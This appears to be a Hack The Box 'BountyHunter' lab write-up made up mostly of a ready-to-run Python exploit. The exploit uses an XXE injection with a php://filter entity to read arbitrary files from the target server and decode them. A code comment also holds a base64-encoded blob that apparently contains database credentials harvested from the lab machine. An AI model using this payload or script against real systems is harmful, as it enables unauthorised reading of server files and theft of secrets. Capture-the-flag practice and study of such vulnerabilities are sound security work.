#### Hack The Box -  BountyHunter 

Simple script using XXE Injection to reading an OS files on HTB BountyHunter machine.  

```python
import requests
from base64 import b64encode, b64decode
import argparse
import re
# import http.client as http_client
# import logging


payload = '<?xml  version="1.0" encoding="ISO-8859-1"?>'\
        '<!DOCTYPE bugreport [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={0}">]>'\
        '<bugreport>'\
        '<title>&xxe;</title>'\
        '<cwe>3452</cwe>'\
        '<cvss>5</cvss>'\
        '<reward>100</reward>'\
        '</bugreport>'



# <tr>
#    <td>Title:</td>
#    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
#  </tr>

vuln_uri = "/tracker_diRbPr00f314.php"

pattern = re.compile(r'<td>Title:</td>\n *<td>(.*)?</td>')

parser = argparse.ArgumentParser()
parser.add_argument('url', metavar='eg: http://10.10.11.100')
parser.add_argument('remote_file_to_read')

args = parser.parse_args()

if not args.url.startswith('http://'):
    print('Error: Invalid url')
    parser.print_help()
    sys.exit()

headers = {
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}

data = {
     'data': b64encode(bytes(payload.format(args.remote_file_to_read), 'utf-8'))
}

url = args.url + vuln_uri

# http_client.HTTPConnection.debuglevel = 1
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True


result = requests.post(url=url, data=data)

file_content = pattern.search(result.text)
if file_content.group(1):
    print(b64decode(file_content.group(1)).decode('utf-8'))
else:
    print('Could not read {0} file'.format(args.remote_file_to_read))

```
